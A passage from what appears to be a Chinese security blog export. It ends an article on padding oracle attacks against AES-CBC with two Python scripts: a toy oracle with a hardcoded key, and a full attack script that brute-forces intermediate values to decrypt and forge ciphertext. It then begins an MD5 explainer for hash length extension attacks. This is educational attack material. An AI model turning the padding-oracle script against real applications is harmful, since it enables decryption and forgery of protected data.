0x32)和IV1(也就是BLOCK1对应的密文)。</p><p>接下来，我们需要弄明白中间值IV1在作为密文是如何解密的。</p><p>只要使用与之前破解过程相同的技巧就行了，我们把它作为密文传递给应用程序，并从全部为NULL的IV开始进行暴力破解。的到IV1对应的中间值IV1_IM。</p><p>通过IV1_IM可以构造BLOCK1的明文为ENCRYPT%20，然后计算得到初始IV值。 </p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2011.06.12.png" style="zoom:80%;"><h1 id="三、exp"><a href="#三、exp" class="headerlink" title="三、exp"></a>三、exp</h1><h2 id="3-1-poa-py"><a href="#3-1-poa-py" class="headerlink" title="3.1 poa.py"></a>3.1 poa.py</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">from</span> hexdump <span class="token keyword">import</span> hexdump<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> IPythonplain <span class="token operator">=</span> <span class="token string">b"Hello World! MTDP! RedTeam! 23333"</span><span class="token keyword">class</span> <span class="token class-name">POA</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    KEY <span class="token operator">=</span> <span class="token string">b"1234567890abcdef"</span>    IV <span class="token operator">=</span> <span class="token string">b"0102030405060708"</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">__pad</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""PKCS7 padding"""</span>        text_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>        amount_to_pad <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size <span class="token operator">-</span> <span class="token punctuation">(</span>text_length <span class="token operator">%</span> AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span>        <span class="token keyword">if</span> amount_to_pad <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            amount_to_pad <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size        pad <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>amount_to_pad<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> text <span class="token operator">+</span> pad <span class="token operator">*</span> amount_to_pad    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">__unpad</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pad <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        _pad <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token operator">-</span>pad<span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> _pad<span class="token punctuation">:</span>            <span class="token keyword">if</span> pad <span class="token operator">!=</span> i<span class="token punctuation">:</span>                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Error Padding! - %s"</span> <span class="token operator">%</span> _pad<span class="token punctuation">)</span>        <span class="token keyword">return</span> text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span>pad<span class="token punctuation">]</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> plain<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pad_plain <span class="token operator">=</span> cls<span class="token punctuation">.</span>__pad<span class="token punctuation">(</span>plain<span class="token punctuation">)</span>        aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>mode<span class="token operator">=</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> key<span class="token operator">=</span>cls<span class="token punctuation">.</span>KEY<span class="token punctuation">,</span> iv<span class="token operator">=</span>cls<span class="token punctuation">.</span>IV<span class="token punctuation">)</span>        cipher <span class="token operator">=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad_plain<span class="token punctuation">)</span>        hexdump<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>        <span class="token keyword">return</span> cipher    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> cipher<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>mode<span class="token operator">=</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> key<span class="token operator">=</span>cls<span class="token punctuation">.</span>KEY<span class="token punctuation">,</span> iv<span class="token operator">=</span>cls<span class="token punctuation">.</span>IV<span class="token punctuation">)</span>        pad_plain <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>        <span class="token keyword">return</span> cls<span class="token punctuation">.</span>__unpad<span class="token punctuation">(</span>pad_plain<span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">decrypt_without_result</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> cipher<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            cls<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token comment"># print(e)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> POA<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    cipher <span class="token operator">=</span> test<span class="token punctuation">(</span><span class="token punctuation">)</span>    plain <span class="token operator">=</span> POA<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span>    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-poa-attack-py"><a href="#3-2-poa-attack-py" class="headerlink" title="3.2 poa_attack.py"></a>3.2 poa_attack.py</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> pdb<span class="token keyword">from</span> poa <span class="token keyword">import</span> test<span class="token punctuation">,</span> POA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> IPython<span class="token keyword">class</span> <span class="token class-name">PaddingOracleAttack</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cipher<span class="token punctuation">,</span> iv<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>cipher <span class="token operator">=</span> cipher        <span class="token comment"># 把密文分割成列表，每个列表元素16字节</span>        self<span class="token punctuation">.</span>cipher_lst <span class="token operator">=</span> self<span class="token punctuation">.</span>split_block<span class="token punctuation">(</span>self<span class="token punctuation">.</span>cipher<span class="token punctuation">)</span>        <span class="token comment"># 解密的中间值</span>        self<span class="token punctuation">.</span>mid_lst <span class="token operator">=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>brute_middle<span class="token punctuation">(</span>self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment"># 存储计算出来的明文</span>        self<span class="token punctuation">.</span>plain_lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">]</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">split_block</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>        cipher_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            cipher_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">:</span> i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> cipher_list    <span class="token keyword">def</span> <span class="token function">calc_new_tail</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> tail<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_tail <span class="token operator">=</span> <span class="token string">b""</span>        <span class="token keyword">for</span> t <span class="token keyword">in</span> tail<span class="token punctuation">:</span>            _tail <span class="token operator">=</span> t <span class="token operator">^</span> <span class="token punctuation">(</span>idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> idx            new_tail <span class="token operator">+=</span> _tail<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> new_tail    <span class="token keyword">def</span> <span class="token function">brute_middle</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cipher_line<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''暴力破解解密的中间值'''</span>        tail <span class="token operator">=</span> <span class="token string">b""</span>        mid_lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># 从pad 为0x01开始 到 0x10</span>        <span class="token keyword">for</span> pad <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 计算新的pad尾部，因为每计算出来一个pad，再往前计算新的pad的时候，尾部的每一个值异或出来都要放大1位。</span>            tail <span class="token operator">=</span> self<span class="token punctuation">.</span>calc_new_tail<span class="token punctuation">(</span>tail<span class="token punctuation">,</span> pad<span class="token punctuation">)</span>            find_pad <span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment"># 形成2个密文块</span>                cipher <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">-</span> pad<span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token operator">+</span> tail <span class="token operator">+</span> cipher_line                <span class="token keyword">if</span> POA<span class="token punctuation">.</span>decrypt_without_result<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment"># print("[!] Cipher - %s" % cipher)</span>                    find_pad <span class="token operator">=</span> <span class="token boolean">True</span>                    tail <span class="token operator">=</span> i<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token operator">+</span> tail                    mid_chr <span class="token operator">=</span> i <span class="token operator">^</span> pad                    mid_lst<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> mid_chr<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> find_pad<span class="token punctuation">:</span>                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Error not find pad!"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>mid_lst<span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">__pad</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""PKCS7 padding"""</span>        text_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>        amount_to_pad <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size <span class="token operator">-</span> <span class="token punctuation">(</span>text_length <span class="token operator">%</span> AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span>        <span class="token keyword">if</span> amount_to_pad <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            amount_to_pad <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size        pad <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>amount_to_pad<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> text <span class="token operator">+</span> pad <span class="token operator">*</span> amount_to_pad    <span class="token keyword">def</span> <span class="token function">fake</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> plain<span class="token punctuation">,</span> cipher<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> mid<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''伪造        :plain: 要伪造的明文        :last_cipher: 一个密文块        :last_mid:  密文块解密出来的中间值        '''</span>        pad_plain <span class="token operator">=</span> self<span class="token punctuation">.</span>__pad<span class="token punctuation">(</span>plain<span class="token punctuation">)</span>        plain_lst <span class="token operator">=</span> self<span class="token punctuation">.</span>split_block<span class="token punctuation">(</span>pad_plain<span class="token punctuation">)</span>        mid <span class="token operator">=</span> mid <span class="token keyword">if</span> mid <span class="token keyword">else</span> self<span class="token punctuation">.</span>mid_lst<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        cipher <span class="token operator">=</span> <span class="token punctuation">[</span>cipher <span class="token keyword">if</span> cipher <span class="token keyword">else</span> self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token comment"># 从最后开始计算</span>        <span class="token keyword">for</span> plain <span class="token keyword">in</span> plain_lst<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            need_iv <span class="token operator">=</span> <span class="token string">b""</span>            <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                _m <span class="token operator">=</span> mid<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>                _p <span class="token operator">=</span> plain<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>                need_iv <span class="token operator">+=</span> <span class="token punctuation">(</span>_m <span class="token operator">^</span> _p<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span>            mid <span class="token operator">=</span> self<span class="token punctuation">.</span>brute_middle<span class="token punctuation">(</span>need_iv<span class="token punctuation">)</span>            cipher<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> need_iv<span class="token punctuation">)</span>        <span class="token keyword">return</span> cipher<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>cipher<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''解密'''</span>        <span class="token comment"># 从最后开始计算</span>        self<span class="token punctuation">.</span>mid_lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> _idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            line_idx <span class="token operator">=</span> _idx <span class="token operator">-</span> <span class="token number">1</span>            cipher_line <span class="token operator">=</span> self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">[</span>line_idx<span class="token punctuation">]</span>            <span class="token keyword">if</span> line_idx <span class="token operator">&gt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token comment"># 获取上一行密文数据，因为每一行的明文加密之前需要与上一行的密文异或</span>                p_cipher_line <span class="token operator">=</span> self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">[</span>line_idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token comment"># 如果是第一行，则其与IV异或</span>                p_cipher_line <span class="token operator">=</span> iv            _mid <span class="token operator">=</span> self<span class="token punctuation">.</span>brute_middle<span class="token punctuation">(</span>cipher_line<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>mid_lst<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> _mid<span class="token punctuation">)</span>            <span class="token keyword">for</span> idx<span class="token punctuation">,</span> _m <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>_mid<span class="token punctuation">)</span><span class="token punctuation">:</span>                plain_chr <span class="token operator">=</span> _m <span class="token operator">^</span> p_cipher_line<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>                self<span class="token punctuation">.</span>plain_lst<span class="token punctuation">[</span>line_idx<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>plain_chr<span class="token punctuation">)</span>        plain <span class="token operator">=</span> <span class="token string">b""</span>        <span class="token keyword">for</span> p <span class="token keyword">in</span> self<span class="token punctuation">.</span>plain_lst<span class="token punctuation">:</span>            plain <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>        <span class="token keyword">return</span> plain<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    cipher <span class="token operator">=</span> test<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># 获取密文</span>    iv <span class="token operator">=</span> POA<span class="token punctuation">.</span>IV         <span class="token comment"># 获取初始化向量</span>    poa_atck <span class="token operator">=</span> PaddingOracleAttack<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    new_iv<span class="token punctuation">,</span> new_cipher <span class="token operator">=</span> poa_atck<span class="token punctuation">.</span>fake<span class="token punctuation">(</span><span class="token string">b"wo ai beijing tianan men!"</span><span class="token punctuation">)</span>    plain <span class="token operator">=</span> poa_atck<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span><span class="token punctuation">)</span>    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 密码学算法安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> padding oracle攻击 </tag>
            
            <tag> web安全中的密码学攻击 </tag>
            
            <tag> 密码学算法安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈希长度扩展攻击</title>
      <link href="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/"/>
      <url>/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="一、MD5哈希算法"><a href="#一、MD5哈希算法" class="headerlink" title="一、MD5哈希算法"></a>一、MD5哈希算法</h1><h2 id="1-1-MD5简介"><a href="#1-1-MD5简介" class="headerlink" title="1.1 MD5简介"></a>1.1 MD5简介</h2><p>MD5（Message Digest Algorithm 5）是一种广泛使用的加密散列函数，它可以产生一个128位（16字节）的散列值（hash value），通常用一个32位的十六进制字符串表示，且具有不可逆性（即理论上从散列值无法推导出明文）。MD5由Ron Rivest在1991年设计，最初被用来作为一种安全的密码散列算法。它接收任意长度的输入，并产生一个固定长度的输出，这个输出被认为是输入数据的“指纹”。然而，由于后来发现MD5存在安全漏洞，它不再被推荐用于密码存储等安全敏感的应用。尽管如此，MD5仍然被用于一些非安全相关的场合，比如文件完整性检查。</p><h3 id="1-1-1-php-中md5函数的用法示例"><a href="#1-1-1-php-中md5函数的用法示例" class="headerlink" title="1.1.1 php 中md5函数的用法示例"></a>1.1.1 php 中md5函数的用法示例</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test string"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">=</span> php5.6 index.php6f8db599de986fab7a21625b7916589c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="1-1-2-哈希函数与加密函数的区别"><a href="#1-1-2-哈希函数与加密函数的区别" class="headerlink" title="1.1.2 哈希函数与加密函数的区别"></a>1.1.2 哈希函数与加密函数的区别</h3><p>哈希将目标转换为具有相同长度的、不可逆的杂凑字符串；</p><p>加密则是将目标转化为不同长度的、可逆的密文，长度一般随明文增长而增加；</p><h3 id="1-1-3-常见的哈希算法介绍"><a href="#1-1-3-常见的哈希算法介绍" class="headerlink" title="1.1.3 常见的哈希算法介绍"></a>1.1.3 常见的哈希算法介绍</h3><p>当前最常用的哈希算法有<code>MD5</code>、<code>SHA-1</code>、<code>SHA-2（SHA-224、SHA-256、SHA-384，和SHA-512并称为SHA-2）</code>等。</p><h2 id="1-2-md5哈希算法流程详解"><a href="#1-2-md5哈希算法流程详解" class="headerlink" title="1.2 md5哈希算法流程详解"></a>1.2 md5哈希算法流程详解</h2><h3 id="1-2-0-步骤概览"><a href="#1-2-0-步骤概览" class="headerlink" title="1.2.0 步骤概览"></a>1.2.0 步骤概览</h3><p>MD5算法的详细流程可以概括为以下几个步骤：</p><p>1）明文填充</p><p>2）初始化变量</p><p>3）分块处理</p><p>4）循环压缩函数处理</p><p>5）更新寄存器</p><p>6）生成哈希值</p><p>具体的数据处理流程如图所示：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.36.49.png" alt="算法数据处理流程概览" style="zoom:80%;"><h3 id="1-2-1-明文填充"><a href="#1-2-1-明文填充" class="headerlink" title="1.2.1 明文填充"></a>1.2.1 明文填充</h3><p>MD5以512bit为分块处理输入信息，每个分块又被分为16*32的子分组，最终输出为4*32的分组，即32为字符串。</p><ul><li>填充</li></ul><p>输入信息的长度(bit)对512求余不等于448时，使用OneAndZeroes对输入信息进行填充使得对512求余448。</p><p>假设对”abc”进行MD5计算，填充步骤：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.32.09.png" alt="明文填充示意图" style="zoom:50%;"><ul><li>记录信息长度</li></ul><p>填充完成后，用64bit存储信息的长度，”abc”共有24bit，即0x18bit，记录的消息长度为：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.33.18.png" alt="长度记录" style="zoom:50%;"><h3 id="1-2-2-初始化变量"><a href="#1-2-2-初始化变量" class="headerlink" title="1.2.2 初始化变量"></a>1.2.2 初始化变量</h3><p>MD5的哈希结果长度为128位，按每32位分成一组共4组。这4组结果是由4个初始值A、B、C、D经过不断演变得到。算法初始化四个32位的寄存器A、B、C、D，这些寄存器同时用于存储中间计算结果</p><p>MD5的官方实现中，A、B、C、D的初始值如下（16进制）：</p><p>A=0x01234567</p><p>B=0x89ABCDEF</p><p>C=0xFEDCBA98</p><p>D=0x76543210</p><h3 id="1-2-3-分块处理"><a href="#1-2-3-分块处理" class="headerlink" title="1.2.3 分块处理"></a>1.2.3 分块处理</h3><p>将填充后的数据按照512位（64字节）一块进行处理，每块包含16个32位字。</p><h3 id="1-2-4-循环压缩函数处理"><a href="#1-2-4-循环压缩函数处理" class="headerlink" title="1.2.4 循环压缩函数处理"></a>1.2.4 循环压缩函数处理</h3><p>对每个512位的数据块进行四轮循环压缩函数处理，每轮处理包括四个步骤：F函数、G函数、H函数和I函数。这些非线性函数在循环压缩函数处理中起着重要作用。</p><p>主要流程是以512位的分块为单位，每一分块经过4轮循环，每轮循环16次迭代，输出128位的结果，存放在缓冲区中，作为下一轮循环缓冲区的输入。</p><p>4轮循环的逻辑如图所示：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.42.19.png" alt="512bit的数据处理流程" style="zoom:50%;"><p>从缓冲区输入128位，从消息分组输入512位，输出结果128位，要注意结果是由循环的结果加上缓冲区的值得到的(加法为模$2^32$加法)。A，B，C，D就是哈希值的四个分组。每一次循环都会让旧的ABCD产生新的ABCD。一共进行多少次循环呢？由原文长度决定。假设处理后的原文长度是M，主循环次数 = M / 512，每个主循环中包含 （512/32） * 4 = 64 次子循环。上面这张图所表达的是单次子循环的流程。</p><p>每轮循环中单次迭代的逻辑如图所示：</p><img 